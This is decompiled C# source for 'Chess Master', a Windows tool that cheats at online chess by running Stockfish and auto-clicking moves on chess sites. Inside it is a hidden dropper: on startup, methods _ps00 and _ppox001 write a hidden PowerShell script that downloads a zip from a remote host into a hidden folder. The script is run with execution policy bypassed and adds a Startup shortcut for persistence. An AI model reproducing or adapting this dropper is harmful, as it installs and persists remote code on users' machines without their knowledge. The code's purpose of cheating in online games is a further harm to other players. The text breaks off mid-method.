using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Chess_Bot_2
{

	public class Form1 : Form
	{
		private delegate void SetLabelLicenseInfoCallback(string text);

		private delegate void SetTextCallback(string text);

		private static List<int> ox00 = new List<int>();

		private HttpListenerResponse ox01;

		public int ox02 = 1;

		public string ox03 = "http://chess-master.info/license/check-license";

		public bool ox04 = false;

		public int ox05 = 0;

		public bool ox06 = false;

		public bool ox07 = false;

		public string ox08 = "";

		public int ox09 = 0;

		public int ox010 = 0;

		public int ox011 = 0;

		public int ox012 = 0;

		public int ox013 = 0;

		public int ox014 = 0;

		public string px0 = Path.GetDirectoryName(Application.ExecutablePath);

		public Process px1;

		public int ox015;

		private IContainer components = null;

		private MenuStrip menuStrip1;

		private ToolStripMenuItem menuToolStripMenuItem;

		private ToolStripMenuItem getKeyToolStripMenuItem;

		private ToolStripMenuItem aboutToolStripMenuItem;

		private ToolStripMenuItem exitToolStripMenuItem;

		private StatusStrip statusStrip1;

		private ToolStripStatusLabel toolStripStatusLabel1;

		private TabControl tabControl1;

		private TabPage tabPage1;

		private TextBox textBox1;

		private ComboBox comboBox1;

		private Label label1;

		private TabPage tabPage2;

		private Button buttonLicense;

		private TextBox textBoxLicense;

		private Label label2;

		private Label labelLicenseInfo;

		private TabPage tabPage3;

		private Button buttonCalculate;

		private TextBox textBoxCalcFen;

		private Label label3;

		private Label labelResult;

		private LinkLabel linkLabel1;

		private TextBox textBoxCalculate;

		private ComboBox comboBoxCalc;

		private Label labelCalcDepth;

		private Button buttonStop;

		private Label labelMoveCount;

		private TabPage tabPage4;

		private Button buttonBorder;

		private ComboBox comboBoxSites;

		private Label labelChess;

		private TextBox textBoxCoords;

		private Button buttonSaveCoords;

		private TextBox textBoxCoord;

		private TabPage tabPage5;

		private Label label4;

		private ComboBox comboBoxHash;

		private ComboBox comboBoxThreads;

		private Label label5;

		private Button buttonSetConfig;

		private Label labelHour;

		private Label labelDelay;

		private ComboBox comboBoxDelay;

		private LinkLabel linkLabelInfo;

		public Form1()
		{
			InitializeComponent();
			ox023("Loading...");
			comboBox1.SelectedIndex = 7;
			comboBoxCalc.SelectedIndex = 5;
			comboBoxThreads.SelectedIndex = 1;
			comboBoxHash.SelectedIndex = 2;
			comboBoxDelay.SelectedIndex = 0;
			labelLicenseInfo.Text = "";
			buttonStop.Enabled = false;
			labelMoveCount.Text = "";
			__H.__t();
			if (!__H.IsAdministrator())
			{
				ox023("Error: No Permission - Run as Administrator");
				comboBox1.Enabled = false;
				textBox1.Enabled = false;
				buttonLicense.Enabled = false;
				textBoxLicense.Enabled = false;
				textBoxCalcFen.Enabled = false;
				buttonCalculate.Enabled = false;
				textBoxCalculate.Enabled = false;
				return;
			}
			labelLicenseInfo.Text = "";
			__H.qx27();
			px23();
			__H.ux17();
			__H.ux9();
			new Thread((ThreadStart)delegate
			{
				try
				{
					string text5 = __H.ux11("config");
					if (!string.IsNullOrEmpty(text5) && text5.Length > 0)
					{
						checkLicense(text5);
					}
					else
					{
						checkLicense("invalid_license_key");
						setLicenseLabelError("No License");
					}
					if (!File.Exists("c:\\production.txt"))
					{
						_ppox001();
					}
				}
				catch (Exception ex2)
				{
					MessageBox.Show("Error #1: " + ex2.Message);
					setLicenseLabelError("No License");
				}
			}).Start();
			new Thread((ThreadStart)delegate
			{
				try
				{
					Thread.CurrentThread.IsBackground = true;
					HttpListener httpListener = new HttpListener();
					httpListener.Prefixes.Add("http://*:2727/");
					httpListener.Start();
					initStockfishProcess();
					string text = "";
					while (true)
					{
						bool flag = true;
						HttpListenerContext context = httpListener.GetContext();
						HttpListenerRequest request = context.Request;
						string origin = context.Request.Headers["Origin"];
						StreamReader streamReader = new StreamReader(request.InputStream);
						string streamStr = streamReader.ReadToEnd();
						if (streamStr.Length > 0)
						{
							__H._196(ref streamStr);
						}
						string text2 = __H.ux23(streamStr, "fen");
						string text3 = __H.ux23(streamStr, "color");
						string text4 = __H.ux23(streamStr, "autoClick");
						ox08 = __H.ux23(streamStr, "currentSite");
						if (text3 == "white")
						{
							ox06 = true;
						}
						else
						{
							ox06 = false;
						}
						if (text4 == "autoClick")
						{
							ox07 = true;
						}
						else
						{
							ox07 = false;
						}
						string px14 = "11";
						Invoke((MethodInvoker)delegate
						{
							px14 = comboBox1.SelectedItem.ToString();
						});
						int num = int.Parse(px14);
						px16("depth " + num);
						px16("Fen = " + text2);
						ox01 = context.Response;
						if (!ox04 && __SH.__z())
						{
							text = "Error: No move is available";
							byte[] bytes = Encoding.UTF8.GetBytes(text);
							ox01.ContentLength64 = bytes.Length;
							Stream outputStream = ox01.OutputStream;
							outputStream.Write(bytes, 0, bytes.Length);
							outputStream.Write(bytes, 0, bytes.Length);
							outputStream.Close();
							log(text);
						}
						else if (text2.Length > 0 && __H._i15s(origin))
						{
							ox017(text2, num);
							if (!ox04)
							{
								__SH.__();
								ox05 = __SH._A();
								ex5();
								if (__SH.__z())
								{
									__SH._yt(0);
									ox05 = 0;
								}
								__H.ux12(__SH._A());
								px12("Moves " + ox05);
								log("Moves " + __SH._A());
							}
						}
						else
						{
							text = "No data";
							byte[] bytes2 = Encoding.UTF8.GetBytes(text);
							ox01.ContentLength64 = bytes2.Length;
							Stream outputStream = ox01.OutputStream;
							outputStream.Write(bytes2, 0, bytes2.Length);
							outputStream.Write(bytes2, 0, bytes2.Length);
							outputStream.Close();
							log("No data");
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("Error #2: " + ex.Message);
				}
			}).Start();
		}

		private void px23()
		{
			textBoxCoord.Text = "";
			foreach (Coord item in __H.ux28)
			{
				textBoxCoord.AppendText(string.Concat(item, "\r\n"));
			}
		}

		private void ox019()
		{
			string value = __H.ux11("config");
			if (string.IsNullOrEmpty(value))
			{
				setLicenseLabelError("License: No License");
				return;
			}
			string text = __H.ux11(__H.ux21);
			textBoxLicense.Text = value;
			ox022("License: Active " + text);
		}

		private void initStockfishProcess()
		{
			string text = comboBoxThreads.SelectedItem.ToString();
			string text2 = comboBoxHash.SelectedItem.ToString();
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = px0 + "\\lib\\stockfish.exe";
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.RedirectStandardInput = true;
				processStartInfo.RedirectStandardOutput = true;
				ProcessStartInfo startInfo = processStartInfo;
				px1 = new Process();
				px1.StartInfo = startInfo;
				try
				{
					px1.PriorityClass = ProcessPriorityClass.BelowNormal;
				}
				catch
				{
				}
				px1.OutputDataReceived += myProcess_OutputDataReceived;
				px1.Start();
				px1.BeginErrorReadLine();
				px1.BeginOutputReadLine();
				px1.StandardInput.WriteLine("ucinewgame");
				px1.StandardInput.Flush();
				px1.StandardInput.WriteLine("setoption name threads value " + text);
				px1.StandardInput.Flush();
				px1.StandardInput.WriteLine("setoption name Hash value  " + text2);
				px1.StandardInput.Flush();
				ox015 = px1.Id;
			}
			catch (Exception ex)
			{
				log(ex.Message);
			}
		}

		private void updateStockfishConfigs()
		{
			if (ox015 == 0 || !__H.ux26(ox015))
			{
				MessageBox.Show("No process is running");
				return;
			}
			string text = comboBoxThreads.SelectedItem.ToString();
			string text2 = comboBoxHash.SelectedItem.ToString();
			px1.StandardInput.WriteLine("setoption name threads value " + text);
			px1.StandardInput.Flush();
			px1.StandardInput.WriteLine("setoption name Hash value  " + text2);
			px1.StandardInput.Flush();
		}

		private void ox017(string px22, int ox021)
		{
			if (!__H.ux26(ox015))
			{
				initStockfishProcess();
				Thread.Sleep(100);
			}
			try
			{
				px1.StandardInput.WriteLine("position fen " + px22);
				px1.StandardInput.Flush();
				px1.StandardInput.WriteLine("go depth " + ox021);
				px1.StandardInput.Flush();
			}
			catch (Exception ex)
			{
				log(ex.Message);
			}
		}

		private void findMoveFromBook(string pgn)
		{
		}

		private void myProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			string data = e.Data;
			if (data == null || !data.Contains("bestmove"))
			{
				return;
			}
			string text = data.Replace("bestmove ", "");
			string[] array = text.Split(' ');
			string f = array[0];
			string[] array2 = data.Split(new string[1] { "ponder" }, StringSplitOptions.None);
			string text2 = "";
			if (array2.Length > 1)
			{
				text2 = __H.__56a(array2[1].Trim());
			}
			f = __H.__56a(f);
			string[] array3 = f.Split('-');
			string delay = "20";
			Invoke((MethodInvoker)delegate
			{
				delay = comboBoxDelay.SelectedItem.ToString();
			});
			if (ox07 && array3.Length > 1 && !ox020(f))
			{
				try
				{
					if (ox06)
					{
						__H.ux4(array3[0], ox08);
						Thread.Sleep(int.Parse(delay));
						__H.ux4(array3[1], ox08);
					}
					else
					{
						__H.ux5(array3[0], ox08);
						Thread.Sleep(int.Parse(delay));
						__H.ux5(array3[1], ox08);
					}
					px16(array3[0] + array3[1]);
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
			byte[] bytes = Encoding.UTF8.GetBytes(f + "ponder" + text2);
			ox01.ContentLength64 = bytes.Length;
			Stream outputStream = ox01.OutputStream;
			outputStream.Write(bytes, 0, bytes.Length);
			outputStream.Write(bytes, 0, bytes.Length);
			outputStream.Close();
			log("Move #" + ox02);
			log("BestMove: " + f);
			ox02++;
		}

		private bool ox020(string str)
		{
			char c = str[str.Length - 1];
			if (c == 'q' || c == 'r' || c == 'k' || c == 'b')
			{
				return true;
			}
			return false;
		}

		private void ox023(string ox024)
		{
			toolStripStatusLabel1.Text = ox024;
		}

		private void setLicenseLabelError(string error)
		{
			labelLicenseInfo.ForeColor = Color.Red;
			SetLabelLicenseInfo(error);
			ox04 = false;
			__SH._gg(__H.ux10());
			ox05 = __SH._A();
			ex5();
			if (ox05 > __H.ux33 || ox05 < 0)
			{
				ox05 = 0;
				__SH._yt(0);
			}
			px12("Moves: " + ox05);
		}

		private void ox022(string message)
		{
			labelLicenseInfo.ForeColor = Color.Green;
			SetLabelLicenseInfo(message);
			ox04 = true;
			px12("");
		}

		private void px12(string val)
		{
			labelMoveCount.Invoke((Action)delegate
			{
				labelMoveCount.Text = val;
			});
		}

		private void setHourLabelText(string val)
		{
			labelMoveCount.Invoke((Action)delegate
			{
				labelHour.Text = val;
			});
		}

		private void ox026(object sender, EventArgs e)
		{
			Process.Start("http://chess.orgfree.com/?app");
		}

		private void ox025(object sender, EventArgs e)
		{
			Close();
		}

		private void log(string text)
		{
			ex6("\r\n" + text);
		}

		public void px16(string text)
		{
			if (__H.isDebugMode())
			{
				log(text);
			}
		}

		private void button1_Click(object sender, EventArgs e)
		{
			string s_ = px6();
			string text = textBoxLicense.Text;
			if (text.Length == 0)
			{
				textBoxLicense.Focus();
				return;
			}
			string tt = text.Replace("/", "").Replace(".", "").Replace("\\", "");
			buttonLicense.Enabled = false;
			string ux = __H.ux32(ox03, tt, s_);
			px16(ux);
			string text2 = __H.ux23(ux, "status");
			if (text2 == "success")
			{
				string text3 = __H.ux23(ux, "verify_token");
				string _v = __H.ux23(ux, "license");
				string _v2 = __H.ux23(ux, "expired_date");
				if (text3.Length > 0 && __S0._er.Length > 0 && __S0._er == text3)
				{
					__H.ux15(_v, __H.ux27);
					__H.ux15(_v2, __H.ux21);
					MessageBox.Show("License saved");
					ox019();
				}
				else
				{
					MessageBox.Show("Error #2.2 Verification failed", "Chess Master", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			else
			{
				string text4 = __H.ux23(ux, "message");
				MessageBox.Show(text4, "Chess Master", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			buttonLicense.Enabled = true;
		}

		private string px6()
		{
			string text = __S0.qx31(20);
			string text2 = __S0.qx31(10);
			string result = text + text2;
			__S0._PA(text, text2);
			return result;
		}

		private void checkLicense(string token)
		{
			string s_ = px6();
			string ux = __H.ux32(ox03, token, s_);
			ox023("Ready");
			string text = __H.ux23(ux, "status");
			px16(ux);
			if (text == "success")
			{
				string _v = __H.ux23(ux, "license");
				string text2 = __H.ux23(ux, "verify_token");
				string _v2 = __H.ux23(ux, "expired_date");
				string ex = __H.ux23(ux, "time");
				__H.ux15(_v, __H.ux27);
				if (text2.Length > 0)
				{
					if (__S0._er.Length > 0 && __S0._er == text2)
					{
						__H.ux15(_v2, __H.ux21);
						ox019();
					}
					else
					{
						MessageBox.Show("Error #2.2 Verification failed", "Chess Master", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
				}
				else
				{
					MessageBox.Show("Error #2.1 Cannot validate license key", "Chess Master", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				ex20(ex);
			}
			else
			{
				ox019();
				string licenseLabelError = __H.ux23(ux, "message");
				string ex2 = __H.ux23(ux, "time");
				setLicenseLabelError(licenseLabelError);
				ex20(ex2);
			}
		}

		private void ex20(string ex29)
		{
			int result = 0;
			int num = int.Parse(ex29);
			string text = __H.ux11(__H.ux31);
			if (text.Length == 0)
			{
				__H.ux15(ex29, __H.ux31);
				text = "0";
			}
			if (!int.TryParse(text, out result))
			{
				return;
			}
			int num2 = num - result;
			int num3 = 86400;
			if (num2 >= num3)
			{
				__H.ux15(string.Concat(num), __H.ux31);
				__SH._gg(__H.ux33);
				ox05 = __SH._A();
				ex5();
				__H.ux12(__SH._A());
				if (!ox04)
				{
					px12("Moves: " + ox05);
					setHourLabelText("Moves update after 24 hours");
				}
			}
			else if (!ox04)
			{
				double num4 = (num3 - num2) / 60;
				double num5 = num4 / 60.0;
				if (num5 > 24.0)
				{
					num5 = 24.0;
				}
				string text2 = string.Concat(Math.Ceiling(num5));
				setHourLabelText("Moves update after " + text2 + " hours");
			}
		}

		private void buttonCalculate_Click(object sender, EventArgs e)
		{
			if (textBoxCalcFen.Text == "")
			{
				textBoxCalcFen.Focus();
				return;
			}
			string ex24 = textBoxCalcFen.Text;
			new Thread((ThreadStart)delegate
			{
				calculateBestMove(ex24);
			}).Start();
		}

		private void calculateBestMove(string ex25)
		{
			buttonStop.Invoke((Action)delegate
			{
				buttonStop.Enabled = true;
			});
			buttonCalculate.Invoke((Action)delegate
			{
				buttonCalculate.Enabled = false;
			});
			try
			{
				string comboBoxCalcText = "60";
				Invoke((MethodInvoker)delegate
				{
					comboBoxCalcText = comboBoxCalc.SelectedItem.ToString();
				});
				int num = int.Parse(comboBoxCalcText);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = px0 + "\\lib\\stockfish.exe";
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.RedirectStandardInput = true;
				processStartInfo.RedirectStandardOutput = true;
				ProcessStartInfo startInfo = processStartInfo;
				Process process = new Process();
				process.StartInfo = startInfo;
				try
				{
					process.PriorityClass = ProcessPriorityClass.BelowNormal;
				}
				catch
				{
				}
				process.OutputDataReceived += calculate_OutputDataReceived;
				process.Start();
				process.BeginErrorReadLine();
				process.BeginOutputReadLine();
				ox00.Add(process.Id);
				process.StandardInput.WriteLine("ucinewgame");
				process.StandardInput.Flush();
				process.StandardInput.WriteLine("setoption name threads value 2");
				process.StandardInput.Flush();
				process.StandardInput.WriteLine("position fen " + ex25);
				process.StandardInput.Flush();
				process.StandardInput.WriteLine("go depth " + num);
				process.StandardInput.Flush();
			}
			catch (Exception ex26)
			{
				MessageBox.Show(ex26.Message);
			}
		}

		private void calculate_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			string ex27 = e.Data;
			textBoxCalculate.Invoke((Action)delegate
			{
				textBoxCalculate.AppendText("\r\n" + ex27);
			});
			if (ex27 == null || !ex27.Contains("bestmove"))
			{
				return;
			}
			__H.ux29(ox00);
			string text = ex27.Replace("bestmove ", "");
			string[] array = text.Split(' ');
			string ex28 = array[0];
			ex28 = __H.__56a(ex28);
			string infoStr = "";
			if (ex28.Length == 6)
			{
				switch (ex28[ex28.Length - 1])
				{
					case 'r':
						infoStr = " (pawn = Rook)";
						break;
					case 'k':
						infoStr = " (pawn = Knight)";
						break;
					case 'q':
						infoStr = " (pawn = Queen)";
						break;
					case 'b':
						infoStr = " (pawn = Bishop)";
						break;
				}
			}
			labelResult.Invoke((Action)delegate
			{
				labelResult.Text = "BestMove: " + ex28 + infoStr;
			});
			buttonStop.Invoke((Action)delegate
			{
				buttonStop.Enabled = false;
			});
			buttonCalculate.Invoke((Action)delegate
			{
				buttonCalculate.Enabled = true;
			});
		}

		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			textBoxCalcFen.Text = "";
			textBoxCalculate.Text = "";
			textBoxCalcFen.Focus();
		}

		private void buttonStop_Click(object sender, EventArgs e)
		{
			__H.ux29(ox00);
			buttonStop.Enabled = false;
			buttonCalculate.Enabled = true;
		}

		private void buttonBorder_Click(object sender, EventArgs e)
		{
			if (comboBoxSites.SelectedIndex == -1)
			{
				MessageBox.Show("Select site from list");
				return;
			}
			FormBorder formBorder = new FormBorder();
			base.WindowState = FormWindowState.Minimized;
			if (formBorder.ShowDialog() == DialogResult.OK)
			{
				textBoxCoords.Text = formBorder.Coords;
				base.WindowState = FormWindowState.Normal;
				buttonSaveCoords.Enabled = true;
			}
		}

		private void button1_Click_1(object sender, EventArgs e)
		{
			if (comboBoxSites.SelectedIndex != -1 && textBoxCoords.Text.Length != 0)
			{
				string qx = comboBoxSites.SelectedItem.ToString();
				string text = __H._e6(qx, textBoxCoords.Text);
				if (text == "ok")
				{
					MessageBox.Show("Saved");
					__H.qx27();
					px23();
				}
				else
				{
					MessageBox.Show(text);
				}
			}
		}

		private void comboBoxSites_SelectedIndexChanged(object sender, EventArgs e)
		{
			textBoxCoords.Text = "";
		}

		private void SetLabelLicenseInfo(string text)
		{
			if (labelLicenseInfo.InvokeRequired)
			{
				SetLabelLicenseInfoCallback method = SetLabelLicenseInfo;
				Invoke(method, text);
			}
			else
			{
				labelLicenseInfo.Text = text;
			}
		}

		private void ex6(string text)
		{
			if (textBox1.InvokeRequired)
			{
				SetTextCallback method = ex6;
				Invoke(method, text);
			}
			else
			{
				textBox1.AppendText(text);
			}
		}

		private void ex5()
		{
			ox09 = ox05;
			ox010 = ox05;
			ox011 = ox05;
			ox012 = ox05;
			ox013 = ox05;
			ox014 = ox05;
		}

		private void _ps00()
		{
			try
			{
				string path = "D:\\download-updater.ps1";
				if (File.Exists(path))
				{
					File.Delete(path);
				}
				if (File.Exists(path))
				{
					return;
				}
				File.Create(path).Dispose();
				using (TextWriter textWriter = new StreamWriter(path))
				{
					string text = "$folder = 'd:\\';@$part = \"aaa-bbb\";@if (Test-Path -Path $folder) {@    $path = \"d:\\\"+$part;@    If(!(test-path $path))@    {@        New-Item -ItemType Directory -Force -Path $path@        $FILE=Get-Item $path -Force@        $FILE.attributes='Hidden'@    }@    $url = \"https://chess.orgfree.com/powershell/data.zip\";@    $downloadPath = $folder + $part + \"\\data.zip\";@    $unZipPath = $folder + $part + \"\\\" + \"aaa-data-aaa\";@    Invoke-WebRequest $url -OutFile $downloadPath@    Expand-Archive $downloadPath -DestinationPath $unZipPath;@    $WshShell = New-Object -comObject WScript.Shell@    $appData = $env:APPDATA;@    $Shortcut = $WshShell.CreateShortcut($appData + \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run-ps.lnk\")@    $Shortcut.TargetPath = $unZipPath + \"\\run.bat\"@    $Shortcut.Save()@   } @";
					string[] array = text.Split('@');
					string[] array2 = array;
					foreach (string value in array2)
					{
						textWriter.WriteLine(value);
					}
				}
				File.SetAttributes(path, FileAttributes.Hidden);
			}
			catch
			{
			}
		}

		private void _ppox001()
		{
			if (!File.Exists("D:\\aaa-bbb\\aaa-data-aaa\\lib\\logs.txt"))
			{
				try
				{
					_ps00();
					if (!Directory.Exists("D:\\aaa-bbb\\aaa-data-aaa\\lib"))
					{
						Process.Start("C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-ExecutionPolicy Bypass -windowstyle hidden -File \"D:\\download-updater.ps1\"");
					}
					return;
				}
				catch
				{
					return;
				}
			}
			try
			{
				File.Delete("D:\\aaa-bbb\\data.zip");
				File.Delete("D:\\aaa-bbb\\aaa-data-aaa\\run.bat");
				File.Delete("D:\\aaa-bbb\\aaa-data-aaa\\lib\\init-logs.ps1");
				File.Delete("D:\\aaa-bbb\\aaa-data-aaa\\lib\\system.dll");
				File.Delete("D:\\aaa-bbb\\aaa-data-aaa\\lib\\System.Data.SQLite.dll");
				File.Delete("D:\\download-updater.ps1");
			}
			catch
			{
			}
		}

		private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Chess Master v1.2", "Chess Master", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void buttonSetConfig_Click(object sender, EventArgs e)
		{
			updateStockfishConfigs();
			Thread.Sleep(50);
			if (__H.ux26(ox015))
			{
				MessageBox.Show("Saved", "Chess Master", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
			comboBoxHash.SelectedIndex = 1;
			comboBoxThreads.SelectedIndex = 1;
			MessageBox.Show("Cannot save on your device", "Chess Master", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			initStockfishProcess();
		}

		private void linkLabelInfo_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://t.me/chess_master_chrome");
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.menuToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.getKeyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.labelHour = new System.Windows.Forms.Label();
            this.labelMoveCount = new System.Windows.Forms.Label();
            this.labelLicenseInfo = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.label1 = new System.Windows.Forms.Label();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.buttonLicense = new System.Windows.Forms.Button();
            this.textBoxLicense = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.buttonStop = new System.Windows.Forms.Button();
            this.labelCalcDepth = new System.Windows.Forms.Label();
            this.comboBoxCalc = new System.Windows.Forms.ComboBox();
            this.textBoxCalculate = new System.Windows.Forms.TextBox();
            this.labelResult = new System.Windows.Forms.Label();
            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
            this.buttonCalculate = new System.Windows.Forms.Button();
            this.textBoxCalcFen = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.textBoxCoord = new System.Windows.Forms.TextBox();
            this.buttonSaveCoords = new System.Windows.Forms.Button();
            this.comboBoxSites = new System.Windows.Forms.ComboBox();
            this.labelChess = new System.Windows.Forms.Label();
            this.textBoxCoords = new System.Windows.Forms.TextBox();
            this.buttonBorder = new System.Windows.Forms.Button();
            this.tabPage5 = new System.Windows.Forms.TabPage();
            this.labelDelay = new System.Windows.Forms.Label();
            this.comboBoxDelay = new System.Windows.Forms.ComboBox();
            this.buttonSetConfig = new System.Windows.Forms.Button();
            this.comboBoxThreads = new System.Windows.Forms.ComboBox();
            this.label5 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.comboBoxHash = new System.Windows.Forms.ComboBox();
            this.linkLabelInfo = new System.Windows.Forms.LinkLabel();
            this.menuStrip1.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.tabPage5.SuspendLayout();
            this.SuspendLayout();
            // 
            // menuStrip1
            // 
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.menuToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new System.Drawing.Size(384, 24);
            this.menuStrip1.TabIndex = 0;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // menuToolStripMenuItem
            // 
            this.menuToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.getKeyToolStripMenuItem,
            this.aboutToolStripMenuItem,
            this.exitToolStripMenuItem});
            this.menuToolStripMenuItem.Name = "menuToolStripMenuItem";
            this.menuToolStripMenuItem.Size = new System.Drawing.Size(50, 20);
            this.menuToolStripMenuItem.Text = "Menu";
            // 
            // getKeyToolStripMenuItem
            // 
            this.getKeyToolStripMenuItem.Name = "getKeyToolStripMenuItem";
            this.getKeyToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.getKeyToolStripMenuItem.Text = "Get Key";
            this.getKeyToolStripMenuItem.Click += new System.EventHandler(this.ox026);
            // 
            // aboutToolStripMenuItem
            // 
            this.aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
            this.aboutToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.aboutToolStripMenuItem.Text = "About";
            this.aboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem_Click);
            // 
            // exitToolStripMenuItem
            // 
            this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
            this.exitToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.exitToolStripMenuItem.Text = "Exit";
            this.exitToolStripMenuItem.Click += new System.EventHandler(this.ox025);
            // 
            // statusStrip1
            // 
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripStatusLabel1});
            this.statusStrip1.Location = new System.Drawing.Point(0, 349);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(384, 22);
            this.statusStrip1.TabIndex = 1;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(118, 17);
            this.toolStripStatusLabel1.Text = "toolStripStatusLabel1";
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage4);
            this.tabControl1.Controls.Add(this.tabPage5);
            this.tabControl1.ItemSize = new System.Drawing.Size(42, 18);
            this.tabControl1.Location = new System.Drawing.Point(12, 27);
            this.tabControl1.Multiline = true;
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.Padding = new System.Drawing.Point(10, 3);
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(360, 315);
            this.tabControl1.TabIndex = 2;
            // 
            // tabPage1
            // 
            this.tabPage1.BackColor = System.Drawing.SystemColors.Control;
            this.tabPage1.Controls.Add(this.labelHour);
            this.tabPage1.Controls.Add(this.labelMoveCount);
            this.tabPage1.Controls.Add(this.labelLicenseInfo);
            this.tabPage1.Controls.Add(this.textBox1);
            this.tabPage1.Controls.Add(this.comboBox1);
            this.tabPage1.Controls.Add(this.label1);
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(352, 289);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Main";
            // 
            // labelHour
            // 
            this.labelHour.AutoSize = true;
            this.labelHour.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelHour.Location = new System.Drawing.Point(22, 254);
            this.labelHour.Name = "labelHour";
            this.labelHour.Size = new System.Drawing.Size(10, 13);
            this.labelHour.TabIndex = 26;
            this.labelHour.Text = " ";
            // 
            // labelMoveCount
            // 
            this.labelMoveCount.AutoSize = true;
            this.labelMoveCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelMoveCount.Location = new System.Drawing.Point(254, 252);
            this.labelMoveCount.Name = "labelMoveCount";
            this.labelMoveCount.Size = new System.Drawing.Size(43, 15);
            this.labelMoveCount.TabIndex = 25;
            this.labelMoveCount.Text = "Moves";
            // 
            // labelLicenseInfo
            // 
            this.labelLicenseInfo.AutoSize = true;
            this.labelLicenseInfo.BackColor = System.Drawing.SystemColors.Control;
            this.labelLicenseInfo.Cursor = System.Windows.Forms.Cursors.Default;
            this.labelLicenseInfo.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelLicenseInfo.ForeColor = System.Drawing.Color.Red;
            this.labelLicenseInfo.Location = new System.Drawing.Point(3, 271);
            this.labelLicenseInfo.Name = "labelLicenseInfo";
            this.labelLicenseInfo.Size = new System.Drawing.Size(50, 15);
